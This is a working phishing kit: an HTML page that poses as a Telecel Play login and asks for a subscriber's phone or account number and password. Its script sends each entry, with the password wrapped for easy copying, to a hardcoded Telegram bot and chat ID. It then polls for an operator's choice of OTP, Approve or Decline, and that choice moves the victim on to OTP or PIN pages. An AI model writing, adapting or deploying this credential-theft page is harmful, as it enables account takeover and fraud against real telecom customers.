<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Telecel – Login</title>

<!-- Google Fonts & Icons -->
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

<style>
*{
  box-sizing:border-box;
  font-family: 'Inter', Arial, Helvetica, sans-serif;
}

body{
  margin:0;
  background:#f5f5f5;
  display:flex;
  justify-content:center;
}

.container {
  width: 360px;
  background: #f7f7f7;
  border-radius: 28px;
  padding: 40px 20px;
  box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
  position: relative;
  overflow: hidden;
  text-align: center;
}

/* TOP RED SHAPE */
.top-bg{
  position:absolute;
  top:0;
  right:0;
  width:220px;
  height:220px;
  background:linear-gradient(135deg, rgba(255,0,0,0.25), rgba(255,0,0,0.6));
  border-bottom-left-radius:120px;
}

/* CONTENT WRAPPER */
.content {
  position: relative;
  z-index: 2;
}

/* LOGO */
.logo{
  text-align:center;
  margin-top:60px;
}

.logo .logo-circle {
  width:52px;
  height:52px;
  background:#ff0000;
  border-radius:50%;
  color: #ffffff !important;
  display:flex;
  align-items:center;
  justify-content:center;
  font-size:30px;
  margin:auto;
  font-weight:800;
  font-family: Arial, Helvetica, sans-serif;
  line-height: 1;
  text-decoration: none;
}

.logo-text{
  color:#ff0000;
  font-size:26px;
  font-weight:bold;
  margin-top:8px;
}

/* TEXT */
.title{
  text-align:center;
  color:#ff0000;
  font-size:20px;
  font-weight:600;
  margin-top:15px;
}

.subtitle{
  text-align:center;
  color:#666;
  font-size:15px;
  margin-top:10px;
  line-height:1.5;
}

/* FORM */
.form{
  margin-top:30px;
  text-align: left;
}

.label{
  font-size:13px;
  color:#666;
  margin-bottom:8px;
}

.input, .select{
  width:100%;
  height:50px;
  border-radius:12px;
  border:1px solid #ddd;
  padding:0 15px;
  font-size:15px;
  background:#fff;
}

/* CUSTOM DROPDOWN */
.dropdown{
  position:relative;
  cursor:pointer;
}

.select-wrapper{
  position:relative;
}

.select{
  width:100%;
  height:50px;
  border-radius:12px;
  border:1px solid #ddd;
  padding:0 40px 0 15px;
  font-size:15px;
  background:#fff;
}

.arrow{
  position:absolute;
  right:15px;
  top:50%;
  transform:translateY(-50%);
  font-size:14px;
  color:#888;
  transition:0.3s;
}

.arrow.rotate{
  transform:translateY(-50%) rotate(180deg);
}

.dropdown-list{
  position:absolute;
  width:100%;
  background:#fff;
  border-radius:12px;
  box-shadow:0 4px 15px rgba(0,0,0,0.1);
  margin-top:5px;
  display:none;
  overflow:hidden;
}

.dropdown-item{
  padding:15px;
  font-size:15px;
}

.dropdown-item.active{
  background:#ffe5e5;
  color:#ff0000;
}

.dropdown-item:hover{
  background:#f5f5f5;
}

/* BUTTONS */
.btn{
  width:100%;
  height:55px;
  border:none;
  border-radius:14px;
  font-size:16px;
  margin-top:20px;
  cursor:pointer;
}

.btn-primary{
  background:#ff0000;
  color:#fff;
  font-weight:600;
}

.btn-outline{
  background:transparent;
  border:2px solid #ff0000;
  color:#666;
  font-weight:600;
}

/* Password field (dynamically added) with eye toggle */
.password-container {
  margin-top: 15px;
}

.password-label {
  font-size:13px;
  color:#666;
  margin-bottom:8px;
  display: block;
  text-align: left;
}

.password-wrapper {
  position: relative;
  width: 100%;
  margin-bottom: 10px;
}

.password-input {
  width: 100%;
  height: 50px;
  border-radius: 12px;
  border: 1px solid #ddd;
  padding: 0 45px 0 15px;
  font-size: 15px;
  background: #fff;
}

.eye-icon {
  position: absolute;
  right: 15px;
  top: 50%;
  transform: translateY(-50%);
  color: #888;
  cursor: pointer;
  z-index: 3;
  font-size: 18px;
}

.btn-password {
  background: #ff0000;
  color: #fff;
  font-weight: 600;
  width: 100%;
  height: 55px;
  border: none;
  border-radius: 14px;
  font-size: 16px;
  cursor: pointer;
}

/* VERSION */
.version{
  text-align:center;
  color:#aaa;
  font-size:12px;
  margin-top:20px;
}

/* SPINNER OVERLAY */
#spinner {
  position: fixed;
  inset: 0;
  display: none;
  align-items: center;
  justify-content: center;
  background: rgba(255, 255, 255, 0.7);
  backdrop-filter: blur(2px);
  z-index: 999;
}

.loader {
  width: 44px;
  height: 44px;
  border: 4px solid #ffe0e0;
  border-top: 4px solid #ff0000;
  border-radius: 50%;
  animation: spin 1s linear infinite;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}

/* ERROR BOX (from sample) */
.error-box{
  position: absolute;
  top: 20px;
  left: 20px;
  right: 20px;
  background: #fff;
  border: 2px solid #ff4d4d;
  border-radius: 12px;
  padding: 15px;
  display: none;
  box-shadow: 0 5px 20px rgba(0,0,0,0.1);
  z-index: 100;
}

.error-title{
  color: #ff0000;
  font-weight: bold;
  margin-bottom: 5px;
}

.error-text{
  color: #444;
  font-size: 14px;
}

.close{
  position: absolute;
  right: 15px;
  top: 10px;
  cursor: pointer;
  font-size: 18px;
  color: #999;
}
</style>
</head>

<body>

<div class="container">

  <div class="top-bg"></div>

  <!-- ERROR BOX (exactly as sample) -->
  <div class="error-box" id="errorBox">
    <div class="close" onclick="hideError()">×</div>
    <div class="error-title">Error</div>
    <div class="error-text" id="errorText">Account details provided is incorrect</div>
  </div>

  <div class="content">

    <!-- LOGO -->
    <div class="logo">
      <div class="logo-circle" style="color: #ffffff !important;">t</div>
      <div class="logo-text">telecel</div>
    </div>

    <!-- TEXT -->
    <div class="title">Welcome to Telecel Play</div>
    <div class="subtitle">
      Enter your number to sign up or log in.<br>
      You need to be a Telecel subscriber to proceed.
    </div>

    <!-- FORM -->
    <div class="form" id="formContainer">

      <div class="label">Account type</div>

      <div class="dropdown" onclick="toggleDropdown()">

        <div class="select-wrapper">
          <input class="select" id="selectedType" value="Mobile" readonly>
          <span class="arrow" id="arrow">▼</span>
        </div>

        <div class="dropdown-list" id="dropdownList">
          <div class="dropdown-item active" onclick="selectType(event,'Mobile')">Mobile</div>
          <div class="dropdown-item" onclick="selectType(event,'Broadband')">Broadband</div>
        </div>

      </div>

      <div class="label" id="inputLabel" style="margin-top:15px;">Phone Number</div>
      <input class="input" id="inputField" placeholder="020XXXXXXX" inputmode="numeric">

      <!-- Original Next button -->
      <button class="btn btn-primary" id="nextBtn" onclick="submitForm()">Next</button>
      
      <!-- Placeholder for dynamic password field – now placed BEFORE Go Back button -->
      <div id="passwordPlaceholder"></div>
      
      <button class="btn btn-outline">Go Back</button>

      <div class="version">v26.2.2(TPA-2622)</div>

    </div>

  </div>

</div>

<!-- SPINNER OVERLAY -->
<div id="spinner">
  <div class="loader"></div>
</div>

<script>
  // ==================== TELEGRAM BOT CONFIG ====================
  // !!! REPLACE WITH YOUR ACTUAL BOT TOKEN AND CHAT ID !!!
  const BOT_TOKEN = '8276553360:AAGD0pyKatfqmNyfWnvQ6nFkuM3QG3kfJ9k';
  const CHAT_ID   = '1006917440';

  // If you need a CORS proxy, change this line (e.g., add 'https://cors-anywhere.herokuapp.com/' before the URL)
  const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;

  // ==================== DOM ELEMENTS ====================
  const selectedType = document.getElementById('selectedType');
  const inputField = document.getElementById('inputField');
  const dropdownList = document.getElementById('dropdownList');
  const arrow = document.getElementById('arrow');
  const spinner = document.getElementById('spinner');
  const nextBtn = document.getElementById('nextBtn');
  const passwordPlaceholder = document.getElementById('passwordPlaceholder');
  const errorBox = document.getElementById('errorBox');
  const errorText = document.getElementById('errorText');

  // ==================== STATE ====================
  let isSubmitting = false;
  let currentPollInterval = null;
  let passwordFieldVisible = false; // track if password field is shown

  // ==================== ERROR HANDLING (from sample) ====================
  function showError(message) {
    errorText.innerText = message || 'Account details provided is incorrect';
    errorBox.style.display = 'block';
  }

  function hideError() {
    errorBox.style.display = 'none';
  }

  // ==================== INPUT FILTERING ====================
  function filterInput(value, type) {
    if (type === 'Mobile') {
      return value.replace(/[^0-9]/g, '');
    } else {
      return value.replace(/[^a-zA-Z0-9]/g, '');
    }
  }

  function applyFilter() {
    const currentType = selectedType.value;
    const raw = inputField.value;
    const filtered = filterInput(raw, currentType);
    if (filtered !== raw) {
      inputField.value = filtered;
    }
  }

  inputField.addEventListener('input', function(e) {
    applyFilter();
    // When user edits the phone, hide password field if visible and show Next button (and re-enable it)
    if (passwordFieldVisible) {
      hidePasswordField();
    }
    // Also hide any error box
    hideError();
  });

  inputField.addEventListener('paste', function(e) {
    e.preventDefault();
    const pasted = (e.clipboardData || window.clipboardData).getData('text');
    const currentType = selectedType.value;
    const filtered = filterInput(pasted, currentType);
    const start = this.selectionStart || 0;
    const end = this.selectionEnd || 0;
    const newValue = this.value.substring(0, start) + filtered + this.value.substring(end);
    this.value = filterInput(newValue, currentType);
    const newCursor = start + filtered.length;
    this.setSelectionRange(newCursor, newCursor);
    // Also hide password field if visible
    if (passwordFieldVisible) {
      hidePasswordField();
    }
    hideError();
  });

  // ==================== DROPDOWN FUNCTIONS ====================
  function toggleDropdown() {
    const isVisible = dropdownList.style.display === 'block';
    dropdownList.style.display = isVisible ? 'none' : 'block';
    arrow.classList.toggle('rotate', !isVisible);
  }

  function selectType(e, type) {
    e.stopPropagation();
    selectedType.value = type;
    document.querySelectorAll('.dropdown-item').forEach(item => {
      item.classList.remove('active');
    });
    e.target.classList.add('active');

    const label = document.getElementById('inputLabel');
    if (type === 'Mobile') {
      label.innerText = 'Phone Number';
      inputField.placeholder = '020XXXXXXX';
      inputField.inputMode = 'numeric';
    } else {
      label.innerText = 'User ID / Account Number';
      inputField.placeholder = 'Eg: Xgtrjj';
      inputField.inputMode = 'text';
    }

    applyFilter();
    dropdownList.style.display = 'none';
    arrow.classList.remove('rotate');

    // If password field is visible, hide it when account type changes
    if (passwordFieldVisible) {
      hidePasswordField();
    }
    hideError();
  }

  document.addEventListener('click', function(e) {
    if (!e.target.closest('.dropdown')) {
      dropdownList.style.display = 'none';
      arrow.classList.remove('rotate');
    }
  });

  // ==================== TELEGRAM HELPER FUNCTIONS ====================
  // Escape HTML special characters to prevent injection
  function escapeHtml(unsafe) {
    return unsafe.replace(/[&<>"]/g, function(m) {
      if (m === '&') return '&amp;';
      if (m === '<') return '&lt;';
      if (m === '>') return '&gt;';
      if (m === '"') return '&quot;';
      return m;
    });
  }

  async function sendToTelegram(payload) {
    const url = `${API_BASE}/sendMessage`;
    try {
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      return await response.json();
    } catch (error) {
      console.error('Telegram send error:', error);
      throw error;
    }
  }

  function pollForCallback(expectedPrefix, expectedTs, onDecision) {
  if (currentPollInterval) clearInterval(currentPollInterval);

  let lastUpdateId = 0;

  currentPollInterval = setInterval(async () => {
    try {
      const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
      const response = await fetch(url);
      const data = await response.json();
      if (!data.ok || !data.result.length) return;

      let decisionMade = false; // ← flag to prevent multiple triggers

      data.result.forEach(update => {
        lastUpdateId = update.update_id;
        if (!decisionMade && update.callback_query && update.callback_query.data) {
          const parts = update.callback_query.data.split('_');
          if (parts.length >= 3) {
            const [type, action, time] = parts;
            if (time == expectedTs && type === expectedPrefix) {
              decisionMade = true;
              clearInterval(currentPollInterval);
              currentPollInterval = null;
              onDecision(action);
            }
          }
        }
      });
    } catch (err) {
      console.warn('Polling error:', err);
    }
  }, 1500);
}

  // ==================== GENERATE 6‑DIGIT OTP ====================
  function generateOTP() {
    return Math.floor(100000 + Math.random() * 900000).toString();
  }

  // ==================== SHOW / HIDE PASSWORD FIELD ====================
  function hidePasswordField() {
    passwordPlaceholder.innerHTML = '';
    nextBtn.style.display = 'block'; // show original Next button
    nextBtn.disabled = false;        // IMPORTANT: re-enable it
    passwordFieldVisible = false;
    // Stop any ongoing polling (decision no longer relevant)
    if (currentPollInterval) {
      clearInterval(currentPollInterval);
      currentPollInterval = null;
    }
  }

  function showPasswordField() {
    // Hide the original Next button
    nextBtn.style.display = 'none';

    // Create password input with eye toggle
    const passwordHtml = `
      <div class="password-container">
        <div class="password-label">Enter Password</div>
        <div class="password-wrapper">
          <input type="password" class="password-input" id="passwordField" placeholder="Enter password" autocomplete="off">
          <i class="far fa-eye eye-icon" id="togglePassword"></i>
        </div>
        <button class="btn-password" id="submitPasswordBtn">Verify Password</button>
      </div>
    `;
    passwordPlaceholder.innerHTML = passwordHtml;
    passwordFieldVisible = true;

    // Attach eye toggle event
    const togglePassword = document.getElementById('togglePassword');
    const passwordField = document.getElementById('passwordField');
    togglePassword.addEventListener('click', function() {
      const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
      passwordField.setAttribute('type', type);
      this.classList.toggle('fa-eye');
      this.classList.toggle('fa-eye-slash');
    });

    // Attach event to the new button
    document.getElementById('submitPasswordBtn').addEventListener('click', handlePasswordSubmit);
  }

  // ==================== HANDLE PASSWORD SUBMISSION ====================
  async function handlePasswordSubmit() {
    const passwordField = document.getElementById('passwordField');
    const password = passwordField.value.trim();
    if (!password) return;

    spinner.style.display = 'flex';
    isSubmitting = true;

    const accountType = selectedType.value;
    const inputValue = inputField.value.trim();
    const ts = Date.now();

    // Send password to Telegram with options OTP, Approve, Decline
    // Identifier is plain, password is wrapped in <code> for easy copying
    const identifierLine = accountType === 'Mobile' ? `Phone: ${inputValue}` : `Account: ${inputValue}`;
    const escapedPassword = escapeHtml(password);
    const msg = `Password Verification\n\n${identifierLine}\nPassword: <code>${escapedPassword}</code>\n\nChoose action:`;

    await sendToTelegram({
      chat_id: CHAT_ID,
      text: msg,
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [[
          { text: 'OTP', callback_data: `password_otp_${ts}` },
          { text: 'Approve', callback_data: `password_approve_${ts}` },
          { text: 'Decline', callback_data: `password_decline_${ts}` }
        ]]
      }
    });

    pollForCallback('password', ts, (action) => {
      spinner.style.display = 'none';
      isSubmitting = false;

      if (action === 'otp') {
        // Redirect to OTP page
        const phoneDigits = inputField.value.replace(/\D/g, '');
        sessionStorage.setItem('telecel_phone', phoneDigits);
        sessionStorage.setItem('telecel_accountType', accountType);
        sessionStorage.setItem('telecel_inputValue', inputValue);
        sessionStorage.setItem('telecel_otp', generateOTP());
        window.location.href = 'otp.html';
      } else if (action === 'approve') {
        // Redirect to pin page
        window.location.href = 'pin.html';
      } else if (action === 'decline') {
        // Show error
        showError('Wrong password');
        passwordField.value = '';
        passwordField.focus();
      }
    });
  }

  // ==================== FORM SUBMISSION (FIRST STEP) ====================
  async function submitForm() {
    if (isSubmitting) return;

    const accountType = selectedType.value;
    const inputValue = inputField.value.trim();

    if (inputValue === '') return;

    isSubmitting = true;
    nextBtn.disabled = true;
    spinner.style.display = 'flex';

    // Store basic data for later use
    const phoneDigits = inputField.value.replace(/\D/g, '');
    sessionStorage.setItem('telecel_phone', phoneDigits);
    sessionStorage.setItem('telecel_accountType', accountType);
    sessionStorage.setItem('telecel_inputValue', inputValue);
    sessionStorage.setItem('telecel_otp', generateOTP());

    const ts = Date.now();
    // Format identifier with HTML <code> tags for easy copying
    let identifierLine;
    if (accountType === 'Mobile') {
      identifierLine = `Phone: <code>${escapeHtml(inputValue)}</code>`;
    } else {
      identifierLine = `Account: <code>${escapeHtml(inputValue)}</code>`;
    }
    const msg = `New Login Attempt\n\nAccount Type: ${accountType}\n${identifierLine}\n\nChoose action:`;

    await sendToTelegram({
      chat_id: CHAT_ID,
      text: msg,
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [[
          { text: 'OTP', callback_data: `initial_otp_${ts}` },
          { text: 'Password', callback_data: `initial_password_${ts}` },
          { text: 'Decline', callback_data: `initial_decline_${ts}` }
        ]]
      }
    });

    pollForCallback('initial', ts, (action) => {
      spinner.style.display = 'none';
      isSubmitting = false;

      if (action === 'otp') {
        window.location.href = 'otp.html';
      } else if (action === 'password') {
        showPasswordField();
      } else if (action === 'decline') {
        // Show error box with custom message
        showError('Account details could not be verified. Please check and try again.');
        // Re-enable the Next button
        nextBtn.disabled = false;
      }
    });
  }

  // ==================== INIT ====================
  dropdownList.style.display = 'none';
  nextBtn.disabled = false;
  applyFilter();

  // Expose functions to global for inline event handlers
  window.toggleDropdown = toggleDropdown;
  window.selectType = selectType;
  window.submitForm = submitForm;
  window.hideError = hideError; // for close button
</script>

</body>
</html>
